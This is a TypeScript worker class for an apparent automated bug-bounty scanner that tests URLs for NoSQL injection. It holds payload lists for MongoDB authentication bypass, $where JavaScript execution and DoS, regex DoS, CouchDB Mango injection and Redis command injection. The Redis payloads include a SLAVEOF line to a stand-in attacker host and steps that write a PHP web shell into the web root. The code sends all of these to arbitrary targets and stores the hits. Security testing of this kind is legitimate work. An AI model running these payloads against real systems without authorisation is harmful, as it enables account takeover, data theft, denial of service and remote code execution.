/**
 * NoSQL Injection Agent
 * Based on PayloadsAllTheThings/NoSQL Injection
 * 
 * Detects and exploits NoSQL injection vulnerabilities:
 * - MongoDB injection
 * - CouchDB injection
 * - Redis injection
 * - Cassandra injection
 * - Authentication bypass
 * - Data extraction
 * - Blind injection
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface NoSQLJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testMongoDB?: boolean;
    testCouchDB?: boolean;
    testRedis?: boolean;
    testBlind?: boolean;
    extractData?: boolean;
  };
}

// MongoDB Injection Payloads
const MONGODB_PAYLOADS = {
  // Authentication bypass
  authBypass: [
    // JSON injection
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$exists": true}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    
    // URL parameter injection
    'username[$ne]=admin&password[$ne]=admin',
    'username[$gt]=&password[$gt]=',
    'username[$exists]=true&password[$exists]=true',
    'username[$regex]=.*&password[$regex]=.*',
    
    // Array injection
    'username=admin&password[$ne]=wrongpassword',
    'username[$in][]=admin&password[$ne]=x',
  ],

  // Operator injection
  operators: [
    '$gt', '$gte', '$lt', '$lte', '$ne', '$eq',
    '$in', '$nin', '$or', '$and', '$not', '$nor',
    '$exists', '$type', '$regex', '$where',
    '$elemMatch', '$size', '$all',
  ],

  // $where JavaScript injection
  whereInjection: [
    "'; return true; var x='",
    '"; return true; var x="',
    "1'; return true; '",
    '1"; return true; "',
    "'; return this.password; var x='",
    "'; sleep(5000); var x='",
    "'; while(1); var x='",
  ],

  // Regex DoS
  regexDoS: [
    '{"$regex": "^(a+)+$"}',
    '{"$regex": "(a|a?)+"}',
    '{"$regex": "((a*)*)*"}',
  ],

  // Data extraction
  extraction: [
    '{"$where": "this.password.match(/^a/) != null"}',
    '{"$regex": "^a"}',
    '{"$gt": "a", "$lt": "b"}',
  ],

  // Blind injection (time-based)
  blindTime: [
    '{"$where": "sleep(5000)"}',
    '{"$where": "this.password && sleep(5000)"}',
    "'; sleep(5000); '",
  ],

  // Blind injection (boolean-based)
  blindBoolean: [
    '{"$where": "this.password.length > 0"}',
    '{"$where": "this.password.charAt(0) == \'a\'"}',
  ],
};

// CouchDB Injection Payloads
const COUCHDB_PAYLOADS = {
  // View injection
  viewInjection: [
    '"},"views":{"test":{"map":"function(doc){emit(doc._id,doc.password)}"}},"_id":"_design/test',
    '"}],"keys":["',
  ],

  // Authentication bypass
  authBypass: [
    '{"type":"user","name":"admin","roles":["_admin"]}',
  ],

  // Mango query injection
  mangoInjection: [
    '{"selector":{"$or":[{"_id":"1"},{"password":{"$gt":""}}]}}',
    '{"selector":{"password":{"$regex":".*"}}}',
  ],
};

// Redis Injection Payloads
const REDIS_PAYLOADS = {
  // Command injection
  commands: [
    '\r\nCONFIG GET *\r\n',
    '\r\nKEYS *\r\n',
    '\r\nINFO\r\n',
    '\r\nDEBUG SLEEP 5\r\n',
    '\r\nSLAVEOF evil.com 6379\r\n',
    '\r\nCONFIG SET dir /var/www/html\r\n',
    '\r\nCONFIG SET dbfilename shell.php\r\n',
    '\r\nSET shell "<?php system($_GET[\'cmd\']); ?>"\r\n',
    '\r\nSAVE\r\n',
  ],

  // Lua script injection
  luaInjection: [
    'EVAL "return redis.call(\'keys\',\'*\')" 0',
    'EVAL "os.execute(\'id\')" 0',
  ],
};

export class NoSQLInjectionAgent extends BaseAgent<NoSQLJob> {
  constructor() {
    super('nosqlinjection');
  }

  protected getSteps() {
    return [
      { name: 'Identify NoSQL endpoints', metadata: {} },
      { name: 'Test MongoDB injection', metadata: {} },
      { name: 'Test authentication bypass', metadata: {} },
      { name: 'Test blind injection', metadata: {} },
      { name: 'Attempt data extraction', metadata: {} },
    ];
  }

  async process(job: Job<NoSQLJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];

    logger.info({ urlCount: urls.length }, 'Starting NoSQL injection testing');

    for (const url of urls) {
      try {
        // Test MongoDB injection
        if (options.testMongoDB !== false) {
          const mongoFindings = await this.testMongoDB(url);
          findings.push(...mongoFindings);
        }

        // Test CouchDB injection
        if (options.testCouchDB) {
          const couchFindings = await this.testCouchDB(url);
          findings.push(...couchFindings);
        }

        // Test Redis injection
        if (options.testRedis) {
          const redisFindings = await this.testRedis(url);
          findings.push(...redisFindings);
        }

        // Test blind injection
        if (options.testBlind) {
          const blindFindings = await this.testBlindInjection(url);
          findings.push(...blindFindings);
        }
      } catch (error) {
        logger.error({ error, url }, 'Error testing NoSQL injection');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async testMongoDB(url: string): Promise<any[]> {
    const findings: any[] = [];

    // Test authentication bypass
    for (const payload of MONGODB_PAYLOADS.authBypass) {
      try {
        const result = await this.testAuthBypass(url, payload);
        if (result.vulnerable) {
          findings.push({
            type: 'mongodb-auth-bypass',
            url,
            payload,
            severity: 'critical',
            evidence: result.evidence,
          });
        }
      } catch (error) {
        // Continue
      }
    }

    // Test operator injection in parameters
    const urlObj = new URL(url);
    for (const [param, value] of urlObj.searchParams.entries()) {
      for (const operator of MONGODB_PAYLOADS.operators) {
        try {
          const testUrl = this.buildOperatorUrl(url, param, operator);
          const result = await this.testOperatorInjection(testUrl);

          if (result.vulnerable) {
            findings.push({
              type: 'mongodb-operator-injection',
              url,
              parameter: param,
              operator,
              severity: 'high',
              evidence: result.evidence,
            });
            break;
          }
        } catch (error) {
          // Continue
        }
      }
    }

    // Test $where injection
    for (const payload of MONGODB_PAYLOADS.whereInjection) {
      try {
        const result = await this.testWhereInjection(url, payload);
        if (result.vulnerable) {
          findings.push({
            type: 'mongodb-where-injection',
            url,
            payload,
            severity: 'critical',
            evidence: result.evidence,
            impact: 'JavaScript execution in database context',
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testCouchDB(url: string): Promise<any[]> {
    const findings: any[] = [];

    // Test Mango query injection
    for (const payload of COUCHDB_PAYLOADS.mangoInjection) {
      try {
        const result = await this.testMangoInjection(url, payload);
        if (result.vulnerable) {
          findings.push({
            type: 'couchdb-mango-injection',
            url,
            payload,
            severity: 'high',
            evidence: result.evidence,
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testRedis(url: string): Promise<any[]> {
    const findings: any[] = [];

    // Test Redis command injection
    for (const payload of REDIS_PAYLOADS.commands) {
      try {
        const result = await this.testRedisCommand(url, payload);
        if (result.vulnerable) {
          findings.push({
            type: 'redis-command-injection',
            url,
            payload: payload.replace(/\r\n/g, '\\r\\n'),
            severity: 'critical',
            evidence: result.evidence,
            impact: 'Redis command execution',
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testBlindInjection(url: string): Promise<any[]> {
    const findings: any[] = [];

    // Time-based blind injection
    for (const payload of MONGODB_PAYLOADS.blindTime) {
      try {
        const startTime = Date.now();
        await this.makeRequest(url, payload);
        const elapsed = Date.now() - startTime;

        if (elapsed > 4500) { // 5 second sleep
          findings.push({
            type: 'mongodb-blind-time',
            url,
            payload,
            severity: 'high',
            evidence: `Response delayed by ${elapsed}ms`,
            technique: 'time-based',
          });
        }
      } catch (error) {
        // Continue
      }
    }

    // Boolean-based blind injection
    for (const payload of MONGODB_PAYLOADS.blindBoolean) {
      try {
        const trueResult = await this.makeRequest(url, payload);
        const falsePayload = payload.replace('> 0', '< 0').replace("== 'a'", "== 'ZZZZZ'");
        const falseResult = await this.makeRequest(url, falsePayload);

        if (trueResult.length !== falseResult.length) {
          findings.push({
            type: 'mongodb-blind-boolean',
            url,
            payload,
            severity: 'high',
            evidence: 'Different response lengths for true/false conditions',
            technique: 'boolean-based',
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testAuthBypass(url: string, payload: string): Promise<any> {
    try {
      // Test as JSON body
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: JSON.parse(payload),
          password: JSON.parse(payload),
        }),
      });

      const body = await response.text();

      // Check for successful authentication indicators
      if (response.status === 200 && 
          (body.includes('token') || body.includes('session') || 
           body.includes('welcome') || body.includes('dashboard'))) {
        return { vulnerable: true, evidence: 'Authentication bypassed' };
      }

      return { vulnerable: false };
    } catch (error) {
      // Try URL parameter format
      try {
        const testUrl = `${url}?${payload}`;
        const response = await fetch(testUrl);
        const body = await response.text();

        if (response.status === 200 && 
            (body.includes('token') || body.includes('session'))) {
          return { vulnerable: true, evidence: 'Authentication bypassed via URL params' };
        }
      } catch {
        // Continue
      }

      return { vulnerable: false };
    }
  }

  private buildOperatorUrl(url: string, param: string, operator: string): string {
    const urlObj = new URL(url);
    urlObj.searchParams.set(`${param}[${operator}]`, '');
    return urlObj.toString();
  }

  private async testOperatorInjection(url: string): Promise<any> {
    try {
      const response = await fetch(url);
      const body = await response.text();

      // Check for data leakage or different behavior
      if (response.status === 200 && body.length > 100) {
        return { vulnerable: true, evidence: 'Operator injection accepted' };
      }

      return { vulnerable: false };
    } catch (error) {
      return { vulnerable: false };
    }
  }

  private async testWhereInjection(url: string, payload: string): Promise<any> {
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          query: { $where: payload },
        }),
      });

      const body = await response.text();

      // Check for JavaScript execution indicators
      if (body.includes('password') || body.includes('secret') || 
          response.status === 500) {
        return { vulnerable: true, evidence: '$where injection executed' };
      }

      return { vulnerable: false };
    } catch (error) {
      return { vulnerable: false };
    }
  }

  private async testMangoInjection(url: string, payload: string): Promise<any> {
    try {
      const response = await fetch(`${url}/_find`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload,
      });

      const body = await response.text();

      if (response.status === 200 && body.includes('docs')) {
        return { vulnerable: true, evidence: 'Mango query injection successful' };
      }

      return { vulnerable: false };
    } catch (error) {
      return { vulnerable: false };
    }
  }

  private async testRedisCommand(url: string, payload: string): Promise<any> {
    // Redis injection typically happens through parameter injection
    const urlObj = new URL(url);
    
    for (const [param, value] of urlObj.searchParams.entries()) {
      try {
        urlObj.searchParams.set(param, value + payload);
        const response = await fetch(urlObj.toString());
        const body = await response.text();

        // Check for Redis response patterns
        if (body.includes('redis_version') || body.includes('QUEUED') ||
            body.includes('OK\r\n') || body.includes('ERR')) {
          return { vulnerable: true, evidence: 'Redis command injection detected' };
        }
      } catch (error) {
        // Continue
      }
    }

    return { vulnerable: false };
  }

  private async makeRequest(url: string, payload: string): Promise<string> {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query: payload }),
    });
    return response.text();
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store NoSQL injection finding');
    }
  }
}

export default new NoSQLInjectionAgent();
